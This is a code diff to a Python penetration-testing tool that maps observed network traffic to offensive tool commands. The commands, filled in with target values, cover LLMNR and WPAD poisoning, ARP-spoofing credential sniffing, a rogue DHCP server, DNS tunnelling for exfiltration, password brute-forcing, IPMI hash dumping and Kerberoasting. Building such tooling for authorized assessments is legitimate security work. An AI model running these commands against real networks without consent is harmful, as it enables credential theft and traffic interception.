@@ -283,7 +283,7 @@ class LLMNRDetectedRule:
             tools=[
                 ToolRecommendation(
                     name="Responder",
-                    command="responder -I eth0 -rdwv",
+                    command="responder -I {interface} -dwv",
                     description="Poison LLMNR/NBT-NS/mDNS queries to capture NTLMv2 hashes",
                     url="https://github.com/lgandx/Responder",
                     install_hint="apt install responder",
@@ -296,8 +296,8 @@ class LLMNRDetectedRule:
                 ),
                 ToolRecommendation(
                     name="Pretender",
-                    command="pretender -i {interface} --spoof-types LLMNR,NETBIOS,MDNS",
-                    description="Cross-platform Go alternative to Responder — less network disruption",
+                    command="pretender -i {interface}",
+                    description="Cross-platform Go alternative to Responder — less network disruption, poisons LLMNR/NBT-NS/mDNS by default",
                     url="https://github.com/RedTeamPentesting/pretender",
                 ),
             ],
@@ -345,21 +345,21 @@ class NetBIOSDetectedRule:
             tools=[
                 ToolRecommendation(
                     name="Responder",
-                    command="responder -I eth0 -rdwv",
+                    command="responder -I {interface} -dwv",
                     description="Poison NBT-NS queries to intercept NTLMv2 authentication",
                     url="https://github.com/lgandx/Responder",
                     install_hint="apt install responder",
                 ),
                 ToolRecommendation(
                     name="Bettercap",
-                    command="bettercap -iface eth0 -eval 'set net.sniff.verbose true; net.sniff on'",
+                    command="bettercap -iface {interface} -eval 'set net.sniff.verbose true; net.sniff on'",
                     description="Sniff NBT-NS traffic and observe authentication attempts",
                     url="https://github.com/bettercap/bettercap",
                 ),
                 ToolRecommendation(
                     name="Pretender",
-                    command="pretender -i {interface} --spoof-types LLMNR,NETBIOS,MDNS",
-                    description="Cross-platform Go alternative to Responder — less network disruption",
+                    command="pretender -i {interface}",
+                    description="Cross-platform Go alternative to Responder — poisons LLMNR/NBT-NS/mDNS by default",
                     url="https://github.com/RedTeamPentesting/pretender",
                 ),
             ],
@@ -405,14 +405,14 @@ class MDNSDetectedRule:
             tools=[
                 ToolRecommendation(
                     name="Responder",
-                    command="responder -I eth0 -rdwv",
+                    command="responder -I {interface} -dwv",
                     description="Poison mDNS queries alongside LLMNR/NBT-NS",
                     url="https://github.com/lgandx/Responder",
                 ),
                 ToolRecommendation(
                     name="Pretender",
-                    command="pretender -i {interface} --spoof-types LLMNR,NETBIOS,MDNS",
-                    description="Cross-platform Go alternative to Responder for mDNS poisoning",
+                    command="pretender -i {interface}",
+                    description="Cross-platform Go alternative to Responder — poisons mDNS/LLMNR/NBT-NS by default",
                     url="https://github.com/RedTeamPentesting/pretender",
                 ),
             ],
@@ -462,15 +462,16 @@ class WPADDetectedRule:
             tools=[
                 ToolRecommendation(
                     name="Responder (WPAD)",
-                    command="responder -I eth0 -wdv",
-                    description="Serve malicious WPAD proxy config to redirect HTTP traffic",
+                    command="responder -I {interface} -wPdv",
+                    description="Serve malicious WPAD proxy config to redirect HTTP traffic and force NTLM auth",
                     url="https://github.com/lgandx/Responder",
                 ),
                 ToolRecommendation(
                     name="mitm6",
-                    command="mitm6 -d <domain>",
+                    command="mitm6 -d {domain} -i {interface}",
                     description="IPv6 MITM + WPAD exploitation via DHCPv6 + DNS",
                     url="https://github.com/dirkjanm/mitm6",
+                    install_hint="pip install mitm6",
                 ),
             ],
         )]
@@ -509,13 +510,13 @@ class ARPActivityRule:
             tools=[
                 ToolRecommendation(
                     name="Bettercap (ARP Spoof)",
-                    command="bettercap -iface eth0 -eval 'set arp.spoof.targets <target_ip>; arp.spoof on; net.sniff on'",
+                    command="bettercap -iface {interface} -eval 'set arp.spoof.targets {ip}; arp.spoof on; net.sniff on'",
                     description="ARP spoofing with integrated traffic sniffing — position as MITM to observe cleartext traffic",
                     url="https://github.com/bettercap/bettercap",
                 ),
                 ToolRecommendation(
                     name="Bettercap (Full Subnet)",
-                    command="bettercap -iface eth0 -eval 'set arp.spoof.fullduplex true; arp.spoof on; net.sniff on'",
+                    command="bettercap -iface {interface} -eval 'set arp.spoof.fullduplex true; arp.spoof on; net.sniff on'",
                     description="Full-duplex ARP spoofing for entire subnet — intercept all traffic between hosts",
                     url="https://github.com/bettercap/bettercap",
                 ),
@@ -567,13 +568,13 @@ class ARPDuplicateIPRule:
             tools=[
                 ToolRecommendation(
                     name="arp-scan",
-                    command="arp-scan -l -I eth0",
+                    command="arp-scan -l -I {interface}",
                     description="Full network ARP scan to verify current IP-MAC bindings and identify conflicts",
                     install_hint="apt install arp-scan",
                 ),
                 ToolRecommendation(
                     name="Bettercap (ARP Monitor)",
-                    command="bettercap -iface eth0 -eval 'net.recon on; net.show; events.stream on'",
+                    command="bettercap -iface {interface} -eval 'net.recon on; net.show; events.stream on'",
                     description="Live network reconnaissance — monitor ARP changes and detect active spoofing",
                     url="https://github.com/bettercap/bettercap",
                 ),
@@ -617,7 +618,7 @@ class GratuitousARPRule:
             tools=[
                 ToolRecommendation(
                     name="Bettercap (ARP Monitor)",
-                    command="bettercap -iface eth0 -eval 'net.recon on; events.stream on'",
+                    command="bettercap -iface {interface} -eval 'net.recon on; events.stream on'",
                     description="Monitor network for ARP anomalies — detect if someone else is already spoofing",
                     url="https://github.com/bettercap/bettercap",
                 ),
@@ -661,20 +662,20 @@ class DHCPStarvationRiskRule:
             tools=[
                 ToolRecommendation(
                     name="Yersinia (DHCP Starvation)",
-                    command="yersinia dhcp -attack 1",
+                    command="yersinia dhcp -attack 1 -interface {interface}",
                     description="Exhaust DHCP address pool with spoofed DISCOVER packets",
                     install_hint="apt install yersinia",
                 ),
                 ToolRecommendation(
-                    name="Bettercap (Rogue DHCP)",
-                    command="bettercap -iface eth0 -eval 'dhcp6.spoof on'",
-                    description="Deploy rogue DHCPv6 server to assign attacker as DNS/gateway",
-                    url="https://github.com/bettercap/bettercap",
+                    name="Metasploit Rogue DHCP",
+                    command="msfconsole -x 'use auxiliary/server/dhcp; set SRVHOST {attacker_ip}; set NETMASK 255.255.255.0; set ROUTER {attacker_ip}; set DNSSERVER {attacker_ip}; run'",
+                    description="Deploy rogue DHCPv4 server — assign attacker as DNS/gateway for new leases",
                 ),
                 ToolRecommendation(
-                    name="Metasploit DHCP",
-                    command="msfconsole -x 'use auxiliary/server/dhcp; set SRVHOST <attacker_ip>; run'",
-                    description="Deploy rogue DHCP server via Metasploit",
+                    name="Bettercap (DHCP Sniff)",
+                    command="bettercap -iface {interface} -eval 'set net.sniff.filter \"udp port 67 or udp port 68\"; net.sniff on'",
+                    description="Monitor DHCP traffic to identify servers and lease details",
+                    url="https://github.com/bettercap/bettercap",
                 ),
             ],
         )]
@@ -732,7 +733,7 @@ class DHCPAnomalyRule:
             tools=[
                 ToolRecommendation(
                     name="dhcpdump",
-                    command="dhcpdump -i eth0",
+                    command="dhcpdump -i {interface}",
                     description="Monitor DHCP traffic to identify rogue servers",
                     install_hint="apt install dhcpdump",
                 ),
@@ -773,14 +774,14 @@ class RouterAdvertisementRule:
             tools=[
                 ToolRecommendation(
                     name="mitm6",
-                    command="mitm6 -d <domain>",
+                    command="mitm6 -d {domain} -i {interface}",
                     description="IPv6 MITM via rogue RA + DNS takeover",
                     url="https://github.com/dirkjanm/mitm6",
                     install_hint="pip install mitm6",
                 ),
                 ToolRecommendation(
                     name="THC-IPv6 fake_router6",
-                    command="fake_router6 eth0 <ipv6_prefix>",
+                    command="fake_router6 {interface}",
                     description="Send rogue Router Advertisements to claim default gateway",
                     install_hint="apt install thc-ipv6",
                 ),
@@ -875,13 +876,14 @@ class TLSWeakVersionRule:
             tools=[
                 ToolRecommendation(
                     name="testssl.sh",
-                    command="testssl.sh --protocols <host>:443",
+                    command="testssl.sh --protocols {ip}:443",
                     description="Comprehensive TLS/SSL testing including protocol version checks",
                     url="https://github.com/drwetter/testssl.sh",
+                    install_hint="apt install testssl.sh",
                 ),
                 ToolRecommendation(
                     name="SSLyze",
-                    command="sslyze --regular <host>:443",
+                    command="sslyze {ip}:443",
                     description="Fast TLS scanner for protocol and cipher analysis",
                     install_hint="pip install sslyze",
                 ),
@@ -927,7 +929,7 @@ class HTTPWithoutTLSRule:
             tools=[
                 ToolRecommendation(
                     name="Bettercap (HTTP Sniff)",
-                    command="bettercap -iface eth0 -eval 'set arp.spoof.targets <target_ip>; arp.spoof on; set net.sniff.verbose true; set net.sniff.filter \"tcp port 80\"; net.sniff on'",
+                    command="bettercap -iface {interface} -eval 'set arp.spoof.targets {ip}; arp.spoof on; set net.sniff.verbose true; set net.sniff.filter \"tcp port 80\"; net.sniff on'",
                     description="ARP spoof target and passively capture HTTP credentials and session tokens",
                     url="https://github.com/bettercap/bettercap",
                 ),
@@ -979,16 +981,16 @@ class UPnPDetectedRule:
             ],
             tools=[
                 ToolRecommendation(
-                    name="miranda",
-                    command="miranda",
-                    description="Interactive UPnP client for device enumeration and exploitation",
-                    install_hint="pip install miranda",
-                ),
-                ToolRecommendation(
-                    name="upnp-arsenal",
+                    name="upnpc",
                     command="upnpc -l",
                     description="List UPnP port mappings and device capabilities",
                     install_hint="apt install miniupnpc",
+                ),
+                ToolRecommendation(
+                    name="Nmap UPnP",
+                    command="nmap -sU -p 1900 --script=upnp-info {ip}",
+                    description="Enumerate UPnP device details via SSDP",
+                    install_hint="apt install nmap",
                 ),
             ],
         )]
@@ -1034,17 +1036,23 @@ class InternalDNSQueriesRule:
             ],
             tools=[
                 ToolRecommendation(
+                    name="dnsrecon",
+                    command="dnsrecon -d {domain} -t std,axfr",
+                    description="DNS enumeration and zone transfer testing",
+                    install_hint="apt install dnsrecon",
+                ),
+                ToolRecommendation(
+                    name="dig (Zone Transfer)",
+                    command="dig axfr {domain} @{dc_ip}",
+                    description="Attempt DNS zone transfer to dump all records",
+                    install_hint="apt install dnsutils",
+                ),
+                ToolRecommendation(
                     name="iodine (DNS Tunneling)",
-                    command="iodine -f <dns_server> <tunnel_domain>",
+                    command="iodine -f {dc_ip} tunnel.{domain}",
                     description="DNS tunneling for data exfiltration testing",
                     url="https://github.com/yarrick/iodine",
                     install_hint="apt install iodine",
-                ),
-                ToolRecommendation(
-                    name="dnsrecon",
-                    command="dnsrecon -d <domain> -t std",
-                    description="DNS enumeration and zone transfer testing",
-                    install_hint="apt install dnsrecon",
                 ),
             ],
         )]
@@ -1076,7 +1084,7 @@ class MultipleGatewaysRule:
             tools=[
                 ToolRecommendation(
                     name="traceroute",
-                    command="traceroute -n <target_ip>",
+                    command="traceroute -n {ip}",
                     description="Trace routing path to discover network topology",
                 ),
             ],
@@ -1174,31 +1182,58 @@ class DiscoveryProtocolRule:
     severity = Severity.INFO
 
     def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
+        cdp_obs = ctx.observations_by_type.get("cdp", [])
+        lldp_obs = ctx.observations_by_type.get("lldp", [])
         ssdp_obs = ctx.observations_by_type.get("ssdp", [])
-        if not ssdp_obs:
-            return []
+
         infra_devices: dict[str, dict] = {}
-        for obs in ssdp_obs:
+        evidence: list[str] = []
+
+        # Direct CDP/LLDP observations
+        for obs in cdp_obs:
+            mac = obs.device_mac
+            if mac not in infra_devices:
+                dev = ctx.device_map.get(mac)
+                infra_devices[mac] = _device_info(dev) if dev else {"mac": mac}
             raw = _parse_raw_data(obs)
-            server = raw.get("server", "").lower()
-            if any(kw in server for kw in ("cisco", "juniper", "aruba", "switch", "router")):
-                mac = obs.device_mac
-                if mac not in infra_devices:
-                    dev = ctx.device_map.get(mac)
-                    infra_devices[mac] = _device_info(dev) if dev else {"mac": mac}
+            if raw.get("device_id"):
+                evidence.append(f"CDP: {raw['device_id']} ({mac})")
+
+        for obs in lldp_obs:
+            mac = obs.device_mac
+            if mac not in infra_devices:
+                dev = ctx.device_map.get(mac)
+                infra_devices[mac] = _device_info(dev) if dev else {"mac": mac}
+            raw = _parse_raw_data(obs)
+            sys_name = raw.get("system_name") or raw.get("chassis_id", "")
+            if sys_name:
+                evidence.append(f"LLDP: {sys_name} ({mac})")
+
+        # Fallback: SSDP from infrastructure-like devices
+        if not infra_devices:
+            for obs in ssdp_obs:
+                raw = _parse_raw_data(obs)
+                server = raw.get("server", "").lower()
+                if any(kw in server for kw in ("cisco", "juniper", "aruba", "switch", "router")):
+                    mac = obs.device_mac
+                    if mac not in infra_devices:
+                        dev = ctx.device_map.get(mac)
+                        infra_devices[mac] = _device_info(dev) if dev else {"mac": mac}
+                        evidence.append(f"SSDP: {raw.get('server', '')} ({mac})")
+
         if not infra_devices:
             return []
+
         return [Finding(
             rule_id=self.rule_id, name=self.name, category=self.category,
             severity=self.severity,
             description=(
-                "Network infrastructure devices were detected via SSDP/UPnP, suggesting "
-                "managed switches that likely run CDP or LLDP. These discovery protocols "
-                "leak infrastructure details: hostnames, IOS versions, VLAN IDs, and "
-                "management IP addresses."
+                "Network infrastructure devices were detected via CDP/LLDP discovery "
+                "protocols. These protocols leak infrastructure details: hostnames, "
+                "IOS versions, VLAN IDs, management IP addresses, and port descriptions."
             ),
             affected_devices=list(infra_devices.values()),
-            evidence=[f"{len(infra_devices)} infrastructure device(s) detected via SSDP"],
+            evidence=evidence[:10] or [f"{len(infra_devices)} infrastructure device(s) detected"],
             tools=[
                 ToolRecommendation(
                     name="Yersinia (CDP Enum)",
@@ -1211,6 +1246,11 @@ class DiscoveryProtocolRule:
                     command="lldpcli show neighbors detail",
                     description="Display LLDP neighbor information (system name, IPs, VLANs)",
                     install_hint="apt install lldpd",
+                ),
+                ToolRecommendation(
+                    name="tcpdump (CDP/LLDP)",
+                    command="tcpdump -i {interface} -nn -v 'ether proto 0x88cc or ether host 01:00:0c:cc:cc:cc'",
+                    description="Capture raw CDP/LLDP frames to extract infrastructure details",
                 ),
             ],
         )]
@@ -1302,8 +1342,8 @@ class DHCPv6ActivityRule:
                 ),
                 ToolRecommendation(
                     name="Pretender",
-                    command="pretender -i {interface} -d {domain} --dhcpv6 --spoof-types LLMNR,MDNS,NETBIOS",
-                    description="Cross-platform LLMNR/mDNS/NBT-NS + DHCPv6 poisoner",
+                    command="pretender -i {interface} -d {domain}",
+                    description="Cross-platform LLMNR/mDNS/NBT-NS + DHCPv6 poisoner — all protocols enabled by default",
                     url="https://github.com/RedTeamPentesting/pretender",
                 ),
             ],
@@ -1465,8 +1505,8 @@ class VLANHoppingDTPRule:
                 ),
                 ToolRecommendation(
                     name="Frogger (VLAN Hopper)",
-                    command="frogger --interface {interface} --target-vlan <vlan_id>",
-                    description="Automated VLAN hopping via 802.1Q double tagging",
+                    command="./frogger.sh",
+                    description="Interactive VLAN hopping script — detects DTP, native VLAN, and performs 802.1Q double tagging",
                     url="https://github.com/nccgroup/vlan-hopping",
                 ),
                 ToolRecommendation(
@@ -1621,7 +1661,7 @@ SERVICE_RULES: list[ServiceRuleConfig] = [
             "captured without any brute-forcing — credentials will appear in plaintext."
         ),
         tools=[
-            ToolRecommendation(name="Bettercap (Passive Capture)", command="bettercap -iface eth0 -eval 'set arp.spoof.targets {ip}; arp.spoof on; set net.sniff.filter \"tcp port {port}\"; net.sniff on'",
+            ToolRecommendation(name="Bettercap (Passive Capture)", command="bettercap -iface {interface} -eval 'set arp.spoof.targets {ip}; arp.spoof on; set net.sniff.filter \"tcp port {port}\"; net.sniff on'",
                               description="ARP spoof target and passively capture Telnet credentials in cleartext",
                               url="https://github.com/bettercap/bettercap"),
             ToolRecommendation(name="Nmap Scripts", command="nmap -sV -p {port} --script=telnet-ntlm-info,telnet-encryption {ip}",
@@ -1643,7 +1683,7 @@ SERVICE_RULES: list[ServiceRuleConfig] = [
             ToolRecommendation(name="Nmap FTP Scripts", command="nmap -sV -p {port} --script=ftp-anon,ftp-syst,ftp-vsftpd-backdoor {ip}",
                               description="Check anonymous access, server version, and known backdoors",
                               install_hint="apt install nmap"),
-            ToolRecommendation(name="Bettercap (Passive Capture)", command="bettercap -iface eth0 -eval 'set arp.spoof.targets {ip}; arp.spoof on; set net.sniff.filter \"tcp port {port}\"; net.sniff on'",
+            ToolRecommendation(name="Bettercap (Passive Capture)", command="bettercap -iface {interface} -eval 'set arp.spoof.targets {ip}; arp.spoof on; set net.sniff.filter \"tcp port {port}\"; net.sniff on'",
                               description="Passively capture FTP credentials as users authenticate — no brute-force needed",
                               url="https://github.com/bettercap/bettercap"),
         ],
@@ -1728,9 +1768,14 @@ SERVICE_RULES: list[ServiceRuleConfig] = [
         severity=Severity.CRITICAL,
         description="BACnet protocol detected — used for HVAC, lighting, and building access control.",
         tools=[
-            ToolRecommendation(name="BACnet Scanner",
-                              command="bacnet-scan {ip}",
-                              description="Enumerate BACnet device objects and properties"),
+            ToolRecommendation(name="Nmap BACnet",
+                              command="nmap -sU -p 47808 --script=bacnet-info {ip}",
+                              description="Enumerate BACnet device identity and properties via Nmap",
+                              install_hint="apt install nmap"),
+            ToolRecommendation(name="BAC0 (Python)",
+                              command="python3 -c \"import BAC0; network = BAC0.lite(); print(network.whois())\"",
+                              description="BACnet device discovery and object enumeration via Python",
+                              install_hint="pip install BAC0"),
         ],
     ),
     ServiceRuleConfig(
@@ -1756,10 +1801,13 @@ SERVICE_RULES: list[ServiceRuleConfig] = [
             "protective relay control. Unauthorized access can disable grid protection."
         ),
         tools=[
-            ToolRecommendation(name="libiec61850 Client",
-                              command="iec61850_client {ip}",
-                              description="Connect to MMS server and enumerate data model",
-                              install_hint="apt install libiec61850-tools"),
+            ToolRecommendation(name="Nmap MMS",
+                              command="nmap -sT -p 102 --script=default {ip}",
+                              description="Scan IEC 61850 MMS port (ISO-TSAP) for active services",
+                              install_hint="apt install nmap"),
+            ToolRecommendation(name="Metasploit IEC 61850",
+                              command="msfconsole -x 'use auxiliary/scanner/scada/modbusdetect; set RHOSTS {ip}; set RPORT 102; run'",
+                              description="Attempt IEC 61850 MMS service detection"),
         ],
     ),
     ServiceRuleConfig(
@@ -1772,10 +1820,13 @@ SERVICE_RULES: list[ServiceRuleConfig] = [
             "robotics, and CNC machines. Disruption can cause physical equipment damage."
         ),
         tools=[
-            ToolRecommendation(name="ethercat CLI",
-                              command="ethercat slaves",
-                              description="Enumerate EtherCAT slave devices on the bus",
-                              install_hint="apt install ethercat-master"),
+            ToolRecommendation(name="Wireshark (EtherCAT)",
+                              command="wireshark -i {interface} -f 'ether proto 0x88a4'",
+                              description="Capture and analyze EtherCAT frames (EtherType 0x88A4)"),
+            ToolRecommendation(name="Nmap EtherCAT",
+                              command="nmap -sT -p 34980 --script=default {ip}",
+                              description="Scan EtherCAT UDP port for EoE (Ethernet over EtherCAT) gateway",
+                              install_hint="apt install nmap"),
         ],
     ),
     ServiceRuleConfig(
@@ -1806,9 +1857,13 @@ SERVICE_RULES: list[ServiceRuleConfig] = [
             "and refinery process control. Affects physical process variables."
         ),
         tools=[
-            ToolRecommendation(name="FF HSE Scanner",
-                              command="ff_scanner --find {ip}",
-                              description="Enumerate FF HSE device tags and function blocks"),
+            ToolRecommendation(name="Nmap FF HSE",
+                              command="nmap -sU -sT -p 1089-1091,3622 --script=default {ip}",
+                              description="Scan Foundation Fieldbus HSE ports for active services",
+                              install_hint="apt install nmap"),
+            ToolRecommendation(name="Wireshark (FF HSE Capture)",
+                              command="wireshark -i {interface} -f 'udp port 1089 or udp port 1090 or udp port 1091'",
+                              description="Capture and analyze Foundation Fieldbus HSE traffic"),
         ],
     ),
     ServiceRuleConfig(
@@ -1821,10 +1876,14 @@ SERVICE_RULES: list[ServiceRuleConfig] = [
             "embedded machinery, conveyors, and automotive manufacturing equipment."
         ),
         tools=[
-            ToolRecommendation(name="canopen-monitor",
-                              command="canopen-monitor --eds {ip}",
-                              description="Monitor and enumerate CANopen network via gateway",
+            ToolRecommendation(name="CANopen Python",
+                              command="python3 -c \"import canopen; net = canopen.Network(); net.connect(channel='can0', bustype='socketcan'); net.scanner.search(); print(net.scanner.nodes)\"",
+                              description="Enumerate CANopen network nodes via Python canopen library",
                               install_hint="pip install canopen"),
+            ToolRecommendation(name="Nmap CAN Gateway",
+                              command="nmap -sT -p 502,2000,4000,5000 --script=default {ip}",
+                              description="Scan common CANopen gateway TCP ports for management interfaces",
+                              install_hint="apt install nmap"),
         ],
     ),
     ServiceRuleConfig(
@@ -1955,11 +2014,11 @@ SERVICE_RULES: list[ServiceRuleConfig] = [
         ),
         tools=[
             ToolRecommendation(name="GetNPUsers (AS-REP Roasting)",
-                              command="GetNPUsers.py <domain>/ -dc-ip {ip} -no-pass -usersfile users.txt",
+                              command="GetNPUsers.py {domain}/ -dc-ip {ip} -no-pass -usersfile users.txt",
                               description="Find accounts without Kerberos pre-authentication — no credentials needed",
                               install_hint="pip install impacket"),
             ToolRecommendation(name="GetUserSPNs (Kerberoasting)",
-                              command="GetUserSPNs.py <domain>/<user>:<pass> -dc-ip {ip} -request",
+                              command="GetUserSPNs.py {domain}/<user>:<pass> -dc-ip {ip} -request",
                               description="Request service tickets for service accounts with SPNs",
                               install_hint="pip install impacket"),
         ],
@@ -2005,12 +2064,196 @@ SERVICE_RULES: list[ServiceRuleConfig] = [
             ToolRecommendation(name="Nmap Mail Scripts", command="nmap -sV -p {port} --script=imap-capabilities,pop3-capabilities {ip}",
                               description="Enumerate mail server capabilities and check if STARTTLS is supported",
                               install_hint="apt install nmap"),
-            ToolRecommendation(name="Bettercap (Mail Sniff)", command="bettercap -iface eth0 -eval 'set arp.spoof.targets {ip}; arp.spoof on; set net.sniff.filter \"tcp port {port}\"; net.sniff on'",
+            ToolRecommendation(name="Bettercap (Mail Sniff)", command="bettercap -iface {interface} -eval 'set arp.spoof.targets {ip}; arp.spoof on; set net.sniff.filter \"tcp port {port}\"; net.sniff on'",
                               description="Passively capture mail credentials via MITM — cleartext protocols leak credentials",
                               url="https://github.com/bettercap/bettercap"),
         ],
     ),
+    ServiceRuleConfig(
+        rule_id="SE-005",
+        service_names=["ssh"],
+        name="SSH Service Detected",
+        severity=Severity.MEDIUM,
+        description=(
+            "SSH service detected. While SSH is encrypted, weak configurations allow "
+            "password brute-forcing, and older versions may be vulnerable to known exploits. "
+            "Enumerate supported authentication methods and check for weak keys."
+        ),
+        tools=[
+            ToolRecommendation(name="Nmap SSH Scripts", command="nmap -sV -p {port} --script=ssh2-enum-algos,ssh-hostkey,ssh-auth-methods {ip}",
+                              description="Enumerate SSH algorithms, host keys, and authentication methods",
+                              install_hint="apt install nmap"),
+            ToolRecommendation(name="ssh-audit", command="ssh-audit {ip}:{port}",
+                              description="Comprehensive SSH server audit — algorithms, vulnerabilities, and hardening recommendations",
+                              url="https://github.com/jtesta/ssh-audit",
+                              install_hint="pip install ssh-audit"),
+            ToolRecommendation(name="NetExec SSH", command="nxc ssh {ip} -u users.txt -p passwords.txt --no-bruteforce",
+                              description="SSH password spraying with user:password pairs",
+                              url="https://github.com/Pennyw0rth/NetExec",
+                              install_hint="pip install netexec"),
+        ],
+    ),
+    ServiceRuleConfig(
+        rule_id="SE-006",
+        service_names=["rdp", "ms-wbt-server"],
+        name="RDP Service Detected",
+        severity=Severity.HIGH,
+        description=(
+            "Remote Desktop Protocol service detected. RDP is a high-value target — "
+            "check for NLA (Network Level Authentication) enforcement, BlueKeep and related "
+            "vulnerabilities, and test for weak credentials."
+        ),
+        tools=[
+            ToolRecommendation(name="Nmap RDP Scripts", command="nmap -sV -p {port} --script=rdp-enum-encryption,rdp-ntlm-info {ip}",
+                              description="Enumerate RDP encryption level, NLA support, and NTLM info (domain, hostname)",
+                              install_hint="apt install nmap"),
+            ToolRecommendation(name="NetExec RDP", command="nxc rdp {ip} -u users.txt -p passwords.txt",
+                              description="RDP credential testing and brute-forcing",
+                              url="https://github.com/Pennyw0rth/NetExec",
+                              install_hint="pip install netexec"),
+            ToolRecommendation(name="xfreerdp", command="xfreerdp /v:{ip}:{port} /cert:ignore /u:<user> /p:<pass>",
+                              description="Connect to RDP for manual verification",
+                              install_hint="apt install freerdp2-x11"),
+        ],
+    ),
+    ServiceRuleConfig(
+        rule_id="SE-007",
+        service_names=["mssql", "ms-sql-s"],
+        name="Microsoft SQL Server Detected",
+        severity=Severity.HIGH,
+        description=(
+            "MSSQL database server detected. Test for default SA credentials, weak "
+            "passwords, and xp_cmdshell availability for command execution. "
+            "MSSQL often has high-privilege service accounts useful for lateral movement."
+        ),
+        tools=[
+            ToolRecommendation(name="NetExec MSSQL", command="nxc mssql {ip} -u sa -p '' --local-auth",
+                              description="Test MSSQL with default SA account (blank password)",
+                              url="https://github.com/Pennyw0rth/NetExec",
+                              install_hint="pip install netexec"),
+            ToolRecommendation(name="Nmap MSSQL Scripts", command="nmap -sV -p {port} --script=ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password {ip}",
+                              description="Enumerate MSSQL version, NTLM info, and test empty SA password",
+                              install_hint="apt install nmap"),
+            ToolRecommendation(name="Impacket mssqlclient", command="mssqlclient.py sa@{ip} -windows-auth",
+                              description="Interactive MSSQL shell for xp_cmdshell, linked servers, and credential extraction",
+                              install_hint="pip install impacket"),
+        ],
+    ),
+    ServiceRuleConfig(
+        rule_id="SE-008",
+        service_names=["mysql", "mariadb", "postgresql", "postgres"],
+        name="Database Service Detected",
+        severity=Severity.HIGH,
+        description=(
+            "Database service detected. Test for anonymous/default credentials, "
+            "excessive privileges, and UDF (User Defined Function) command execution. "
+            "Databases often contain sensitive data and credentials for other services."
+        ),
+        tools=[
+            ToolRecommendation(name="Nmap DB Scripts", command="nmap -sV -p {port} --script=mysql-info,mysql-empty-password,pgsql-brute {ip}",
+                              description="Enumerate database version and test for empty/default credentials",
+                              install_hint="apt install nmap"),
+            ToolRecommendation(name="Hydra", command="hydra -l root -P /usr/share/wordlists/rockyou.txt {ip} mysql -s {port}",
+                              description="Brute-force database credentials",
+                              install_hint="apt install hydra"),
+        ],
+    ),
+    ServiceRuleConfig(
+        rule_id="SE-030",
+        service_names=["ipmi", "bmc"],
+        name="IPMI/BMC Service Detected",
+        severity=Severity.CRITICAL,
+        description=(
+            "IPMI (Intelligent Platform Management Interface) detected. IPMI 2.0 has a "
+            "known vulnerability that allows retrieval of password hashes for any valid user "
+            "without authentication. BMC often has default credentials (ADMIN/ADMIN)."
+        ),
+        tools=[
+            ToolRecommendation(name="Nmap IPMI", command="nmap -sU -p 623 --script=ipmi-version,ipmi-cipher-zero {ip}",
+                              description="Check IPMI version and test for cipher zero vulnerability",
+                              install_hint="apt install nmap"),
+            ToolRecommendation(name="Metasploit IPMI Hash Dump",
+                              command="msfconsole -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS {ip}; run'",
+                              description="Dump IPMI 2.0 RAKP password hashes without authentication"),
+            ToolRecommendation(name="ipmitool", command="ipmitool -I lanplus -H {ip} -U ADMIN -P ADMIN chassis status",
+                              description="Test IPMI with common default credentials",
+                              install_hint="apt install ipmitool"),
+        ],
+    ),
+    ServiceRuleConfig(
+        rule_id="SE-031",
+        service_names=["vnc"],
+        name="VNC Service Detected",
+        severity=Severity.HIGH,
+        description=(
+            "VNC remote desktop service detected. VNC often uses weak password-only "
+            "authentication with no account lockout. Some versions have no authentication "
+            "at all. VNC passwords are limited to 8 characters, making brute-forcing fast."
+        ),
+        tools=[
+            ToolRecommendation(name="Nmap VNC Scripts", command="nmap -sV -p {port} --script=vnc-info,vnc-brute {ip}",
+                              description="Enumerate VNC version and test for no-auth or weak passwords",
+                              install_hint="apt install nmap"),
+            ToolRecommendation(name="Hydra VNC", command="hydra -P /usr/share/wordlists/rockyou.txt {ip} vnc -s {port}",
+                              description="Brute-force VNC password (max 8 chars, no username required)",
+                              install_hint="apt install hydra"),
+        ],
+    ),
+    ServiceRuleConfig(
+        rule_id="SE-032",
+        service_names=["winrm", "wsman"],
+        name="WinRM Service Detected",
+        severity=Severity.HIGH,
+        description=(
+            "Windows Remote Management service detected. WinRM provides PowerShell "
+            "remoting and command execution. Test for default/weak credentials — "
+            "authenticated WinRM access provides full command execution on the host."
+        ),
+        tools=[
+            ToolRecommendation(name="NetExec WinRM", command="nxc winrm {ip} -u users.txt -p passwords.txt",
+                              description="WinRM credential testing and command execution",
+                              url="https://github.com/Pennyw0rth/NetExec",
+                              install_hint="pip install netexec"),
+            ToolRecommendation(name="evil-winrm", command="evil-winrm -i {ip} -u <user> -p <pass>",
+                              description="Interactive WinRM shell with PowerShell and file transfer capabilities",
+                              url="https://github.com/Hackplayers/evil-winrm",
+                              install_hint="gem install evil-winrm"),
+        ],
+    ),
 ]
+
+
+def _hydrate_tools(templates: list[ToolRecommendation], ctx: AnalysisContext,
+                    affected: list[dict] | None = None) -> list[ToolRecommendation]:
+    """Substitute placeholders in tool commands with actual values.
+
+    Works for passive rules, service rules, and chain tools.
+    """
+    first = (affected[0] if affected else {}) if affected is not None else {}
+    ip = first.get("ip") or "<target_ip>"
+    port = str(first.get("port") or "<port>")
+
+    replacements = {
+        "{ip}": str(ip),
+        "{target_ip}": str(ip),
+        "{port}": port,
+        "{interface}": ctx.interface or "eth0",
+        "{gateway_ip}": ctx.gateway_ip or "<gateway_ip>",
+        "{domain}": ctx.domain or "<domain>",
+        "{attacker_ip}": ctx.attacker_ip or "<attacker_ip>",
+        "{dc_ip}": ctx.dc_ip or "<dc_ip>",
+    }
+
+    result = []
+    for t in templates:
+        cmd = t.command
+        for placeholder, value in replacements.items():
+            cmd = cmd.replace(placeholder, value)
+        result.append(ToolRecommendation(
+            name=t.name, command=cmd, description=t.description,
+            url=t.url, install_hint=t.install_hint,
+        ))
+    return result
 
 
 class ServiceExploitEvaluator:
@@ -2033,8 +2276,7 @@ class ServiceExploitEvaluator:
                     })
             if not affected:
                 continue
-            # Substitute {ip} and {port} with first affected device for display
-            tools = self._hydrate_tools(rule.tools, affected, ctx)
+            tools = _hydrate_tools(rule.tools, ctx, affected)
             findings.append(Finding(
                 rule_id=rule.rule_id,
                 name=rule.name,
@@ -2046,39 +2288,6 @@ class ServiceExploitEvaluator:
                 tools=tools,
             ))
         return findings
-
-    @staticmethod
